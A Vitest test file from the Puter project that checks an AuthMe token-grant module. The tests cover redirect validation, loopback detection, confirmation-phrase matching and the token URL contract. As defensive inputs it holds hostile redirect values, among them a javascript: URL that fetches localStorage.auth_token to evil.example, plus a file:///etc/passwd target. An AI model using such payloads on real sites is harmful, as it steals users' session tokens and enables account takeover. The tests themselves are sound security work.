/*
 * Copyright (C) 2024-present Puter Technologies Inc.
 *
 * This file is part of Puter.
 *
 * Puter is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

import { describe, expect, it } from 'vitest';
import {
    FULL_TOKEN_PARAM,
    FULL_TOKEN_VALUE,
    authmeRequestUrl,
    authmeReturnUrl,
    confirmationSatisfied,
    fullTokenAllowed,
    isDeliverableRedirect,
    isLoopbackTarget,
    isRemoteBackendGui,
    shouldUseRemoteAuthme,
    urlTokenParam,
    wantsFullToken,
} from './authmeGrant.js';

describe('wantsFullToken', () => {
    const params = (qs) => new URLSearchParams(qs);

    it('is true only for the exact opt-in value', () => {
        expect(wantsFullToken(params(`${FULL_TOKEN_PARAM}=${FULL_TOKEN_VALUE}`)))
            .toBe(true);
    });

    // The default grade is the restricted API token. An AuthMe link that
    // doesn't name the session grade must not be able to produce one.
    it('is false when the param is absent', () => {
        expect(wantsFullToken(params(''))).toBe(false);
        expect(wantsFullToken(params('redirectURL=http://localhost:4000/')))
            .toBe(false);
    });

    it('is false for near-miss values', () => {
        expect(wantsFullToken(params(`${FULL_TOKEN_PARAM}=Session`))).toBe(false);
        expect(wantsFullToken(params(`${FULL_TOKEN_PARAM}=session `))).toBe(false);
        expect(wantsFullToken(params(`${FULL_TOKEN_PARAM}=true`))).toBe(false);
        expect(wantsFullToken(params(`${FULL_TOKEN_PARAM}=`))).toBe(false);
        expect(wantsFullToken(params('token_type_x=session'))).toBe(false);
    });

    it('does not throw on a missing or malformed params object', () => {
        expect(wantsFullToken(undefined)).toBe(false);
        expect(wantsFullToken({})).toBe(false);
    });
});

describe('isDeliverableRedirect', () => {
    it('accepts ordinary web destinations', () => {
        expect(isDeliverableRedirect('http://localhost:4000/')).toBe(true);
        expect(isDeliverableRedirect('https://example.com/oauth/callback?flow=x'))
            .toBe(true);
    });

    // The one that matters. Assigning a `javascript:` URL to `location`
    // executes it in the granting document, i.e. same-origin script execution
    // on the account origin. `URL` only encodes the query it appends, so a
    // payload with no `?` and a trailing `//` reaches `location.href` intact.
    it('refuses javascript: targets, including ones that survive URL encoding', () => {
        expect(isDeliverableRedirect('javascript:alert(1)')).toBe(false);
        expect(isDeliverableRedirect(
            "javascript:fetch('//evil.example/'+localStorage.auth_token)//",
        )).toBe(false);
        expect(isDeliverableRedirect('JavaScript:alert(1)')).toBe(false);
    });

    it('refuses other non-web schemes', () => {
        expect(isDeliverableRedirect('data:text/html,<script>1</script>'))
            .toBe(false);
        expect(isDeliverableRedirect('file:///etc/passwd')).toBe(false);
        expect(isDeliverableRedirect('vbscript:msgbox')).toBe(false);
    });

    it('refuses anything that isn’t a URL at all', () => {
        expect(isDeliverableRedirect('not a url')).toBe(false);
        expect(isDeliverableRedirect('')).toBe(false);
        expect(isDeliverableRedirect(null)).toBe(false);
        expect(isDeliverableRedirect(undefined)).toBe(false);
    });
});

describe('isLoopbackTarget', () => {
    it('accepts the forms a local dev GUI is reached by', () => {
        expect(isLoopbackTarget('http://localhost:4000/')).toBe(true);
        expect(isLoopbackTarget('http://localhost:4000')).toBe(true);
        expect(isLoopbackTarget('http://127.0.0.1:4000/')).toBe(true);
        expect(isLoopbackTarget('http://127.1.2.3:4000/')).toBe(true);
        expect(isLoopbackTarget('http://[::1]:4000/')).toBe(true);
        expect(isLoopbackTarget('http://puter.localhost:4100/')).toBe(true);
    });

    // A hostname that merely starts or ends with something loopback-shaped is
    // an ordinary remote host, and is the obvious way to try to fool this.
    it('is not fooled by loopback-looking labels', () => {
        expect(isLoopbackTarget('http://localhost.evil.example/')).toBe(false);
        expect(isLoopbackTarget('http://127.0.0.1.evil.example/')).toBe(false);
        expect(isLoopbackTarget('http://notlocalhost/')).toBe(false);
        expect(isLoopbackTarget('https://evil.example/?x=localhost')).toBe(false);
    });

    it('rejects remote and LAN destinations', () => {
        expect(isLoopbackTarget('https://evil.example/')).toBe(false);
        expect(isLoopbackTarget('https://puter.com')).toBe(false);
        expect(isLoopbackTarget('http://192.168.1.5:4000/')).toBe(false);
    });

    // Loopback is not a licence to skip the scheme check.
    it('still requires a deliverable scheme', () => {
        expect(isLoopbackTarget('javascript:alert(1)')).toBe(false);
        expect(isLoopbackTarget('')).toBe(false);
        expect(isLoopbackTarget(undefined)).toBe(false);
    });
});

describe('fullTokenAllowed', () => {
    const asked = new URLSearchParams(`${FULL_TOKEN_PARAM}=${FULL_TOKEN_VALUE}`);
    const silent = new URLSearchParams('');

    it('offers the session grade to the local dev GUI it exists for', () => {
        expect(fullTokenAllowed(asked, 'http://localhost:4000/')).toBe(true);
        expect(fullTokenAllowed(asked, 'http://127.0.0.1:4000/')).toBe(true);
    });

    // The takeover primitive this closes: a crafted link on the real origin
    // trading a typed phrase for a credential that can change the password,
    // email, and 2FA settings.
    it('never offers it to a remote destination, however it is asked for', () => {
        expect(fullTokenAllowed(asked, 'https://evil.example/')).toBe(false);
        expect(fullTokenAllowed(asked, 'http://192.168.1.5/')).toBe(false);
        expect(fullTokenAllowed(asked, 'javascript:alert(1)')).toBe(false);
        expect(fullTokenAllowed(asked, '')).toBe(false);
        expect(fullTokenAllowed(asked, undefined)).toBe(false);
    });

    it('still requires the caller to have named the grade', () => {
        expect(fullTokenAllowed(silent, 'http://localhost:4000/')).toBe(false);
        expect(fullTokenAllowed(undefined, 'http://localhost:4000/')).toBe(false);
    });
});

describe('confirmationSatisfied', () => {
    const PHRASE = 'grant full access';

    it('accepts the phrase', () => {
        expect(confirmationSatisfied(PHRASE, PHRASE)).toBe(true);
    });

    // Deliberate action is the point, not a spelling test.
    it('ignores case and surrounding whitespace', () => {
        expect(confirmationSatisfied('  Grant Full Access  ', PHRASE)).toBe(true);
        expect(confirmationSatisfied('GRANT FULL ACCESS', PHRASE)).toBe(true);
    });

    it('rejects anything else', () => {
        expect(confirmationSatisfied('', PHRASE)).toBe(false);
        expect(confirmationSatisfied('   ', PHRASE)).toBe(false);
        expect(confirmationSatisfied('grant', PHRASE)).toBe(false);
        expect(confirmationSatisfied('grant full access!', PHRASE)).toBe(false);
        expect(confirmationSatisfied('grantfullaccess', PHRASE)).toBe(false);
        expect(confirmationSatisfied('yes', PHRASE)).toBe(false);
    });

    it('rejects non-string inputs rather than coercing them into a match', () => {
        expect(confirmationSatisfied(undefined, PHRASE)).toBe(false);
        expect(confirmationSatisfied(null, PHRASE)).toBe(false);
    });

    // A missing translation would otherwise resolve to an empty phrase, and an
    // empty phrase would make an untouched input count as approval.
    it('never approves when the phrase itself is empty', () => {
        expect(confirmationSatisfied('', '')).toBe(false);
        expect(confirmationSatisfied('anything', '')).toBe(false);
        expect(confirmationSatisfied('', undefined)).toBe(false);
        expect(confirmationSatisfied('   ', '   ')).toBe(false);
    });
});

// The bug this file exists to prevent: the granting side wrote `token` and the
// receiving side read `auth_token`, so the grant arrived and was silently
// dropped. Both directions now go through the builders here, and this closes
// the loop over the whole contract without needing a browser.
describe('the AuthMe URL contract, round-tripped', () => {
    const GUI = 'https://puter.com';
    const DEV = 'http://localhost:4000/';

    it('survives request → approval → return → sign-in', () => {
        const req = authmeRequestUrl(GUI, DEV, { fullToken: true });

        // …as the granting origin reads it
        expect(req.origin).toBe(GUI);
        expect(req.searchParams.get('action')).toBe('authme');
        expect(wantsFullToken(req.searchParams)).toBe(true);
        const redirectURL = req.searchParams.get('redirectURL');
        expect(redirectURL).toBe(DEV);

        // …as the returning redirect is built
        const ret = authmeReturnUrl(redirectURL, 'tok-123');

        // …as the receiving GUI reads it
        const param = urlTokenParam(ret.searchParams, true);
        expect(param).not.toBe(null);
        expect(ret.searchParams.get(param)).toBe('tok-123');
    });

    it('round-trips the restricted grade too', () => {
        const req = authmeRequestUrl(GUI, DEV);
        expect(wantsFullToken(req.searchParams)).toBe(false);
        const ret = authmeReturnUrl(req.searchParams.get('redirectURL'), 'tok');
        expect(urlTokenParam(ret.searchParams, true)).not.toBe(null);
    });

    it('preserves a redirect target that already has query and path', () => {
        const target = 'http://localhost:4000/desktop?foo=bar';
        const req = authmeRequestUrl(GUI, target);
        expect(req.searchParams.get('redirectURL')).toBe(target);
        const ret = authmeReturnUrl(target, 'tok');
        expect(ret.searchParams.get('foo')).toBe('bar');
        expect(ret.pathname).toBe('/desktop');
    });

    it('replaces rather than appends a token already on the target', () => {
        const ret = authmeReturnUrl('http://localhost:4000/?token=stale', 'new');
        expect(ret.searchParams.getAll('token')).toEqual(['new']);
    });

    // Backstop for the sole constructor of the `location.href` assignment: even
    // if a caller forgets to pre-check, no `javascript:` URL gets built into a
    // navigation. Callers pre-check so this throw isn't the user-facing path.
    it('refuses to build a return URL for an undeliverable target', () => {
        expect(() => authmeReturnUrl('javascript:alert(1)', 'tok')).toThrow();
        expect(() => authmeReturnUrl(
            "javascript:fetch('//evil.example/'+localStorage.auth_token)//",
            'tok',
        )).toThrow();
        expect(() => authmeReturnUrl('data:text/html,x', 'tok')).toThrow();
        expect(() => authmeReturnUrl('not a url', 'tok')).toThrow();
    });
});

describe('urlTokenParam', () => {
    const params = (qs) => new URLSearchParams(qs);

    it('picks up the GUI’s own parameter anywhere', () => {
        expect(urlTokenParam(params('auth_token=abc'), false)).toBe('auth_token');
        expect(urlTokenParam(params('auth_token=abc'), true)).toBe('auth_token');
    });

    // AuthMe hands its grant back as `token`. This is the regression: pointing
    // `redirectURL` straight at the dev GUI dropped the `tools/auth_gui.js`
    // listener that used to rename it, so the token arrived and was ignored.
    it('accepts AuthMe’s `token` when returning to a remote-backend GUI', () => {
        expect(urlTokenParam(params('token=abc'), true)).toBe('token');
    });

    // Not on a normal deployment: puter.com keeps exactly one URL-token entry
    // point, so a link can't push a session at it under the other name.
    it('ignores `token` on a normal deployment', () => {
        expect(urlTokenParam(params('token=abc'), false)).toBe(null);
    });

    it('prefers auth_token when both are present', () => {
        expect(urlTokenParam(params('token=a&auth_token=b'), true))
            .toBe('auth_token');
    });

    it('treats an empty value as absent', () => {
        expect(urlTokenParam(params('auth_token='), true)).toBe(null);
        expect(urlTokenParam(params('token='), true)).toBe(null);
        expect(urlTokenParam(params(''), true)).toBe(null);
    });

    it('does not throw on a missing or malformed params object', () => {
        expect(urlTokenParam(undefined, true)).toBe(null);
        expect(urlTokenParam({}, true)).toBe(null);
    });
});

describe('isRemoteBackendGui', () => {
    it('is false on a normal deployment (GUI served by its own backend)', () => {
        expect(isRemoteBackendGui('https://puter.com', 'https://puter.com'))
            .toBe(false);
    });

    it('is true for a locally served GUI pointed at a remote backend', () => {
        expect(isRemoteBackendGui('https://puter.com', 'http://localhost:4000'))
            .toBe(true);
    });

    it('distinguishes scheme and port, not just host', () => {
        expect(isRemoteBackendGui('https://puter.com', 'http://puter.com'))
            .toBe(true);
        expect(isRemoteBackendGui('http://puter.localhost:4100', 'http://puter.localhost:4000'))
            .toBe(true);
    });

    // Boot order: if either value isn't populated yet, don't claim remote —
    // that would redirect a normal page load out to AuthMe.
    it('is false when either origin is missing', () => {
        expect(isRemoteBackendGui(undefined, 'http://localhost:4000')).toBe(false);
        expect(isRemoteBackendGui('https://puter.com', undefined)).toBe(false);
        expect(isRemoteBackendGui('', '')).toBe(false);
    });
});

describe('shouldUseRemoteAuthme', () => {
    it('is true for the supported setup: a locally served GUI, remote backend', () => {
        expect(shouldUseRemoteAuthme('https://puter.com', 'http://localhost:4000'))
            .toBe(true);
        expect(shouldUseRemoteAuthme('https://puter.com', 'http://127.0.0.1:4000'))
            .toBe(true);
    });

    it('is false on a normal deployment', () => {
        expect(shouldUseRemoteAuthme('https://puter.com', 'https://puter.com'))
            .toBe(false);
    });

    // A deployment reached over a hostname that isn't its `config.origin` — an
    // alias, `www.`, a staging name — differs from `gui_origin` but must not
    // start accepting `?token=` or auto-redirecting into a grant.
    it('is false for a deployment served under a non-canonical hostname', () => {
        expect(shouldUseRemoteAuthme('https://puter.com', 'https://www.puter.com'))
            .toBe(false);
        expect(shouldUseRemoteAuthme('https://puter.com', 'https://staging.puter.com'))
            .toBe(false);
        expect(shouldUseRemoteAuthme('https://puter.com', 'http://puter.com'))
            .toBe(false);
    });

    it('is false when either origin is missing', () => {
        expect(shouldUseRemoteAuthme(undefined, 'http://localhost:4000'))
            .toBe(false);
        expect(shouldUseRemoteAuthme('https://puter.com', undefined)).toBe(false);
    });
});
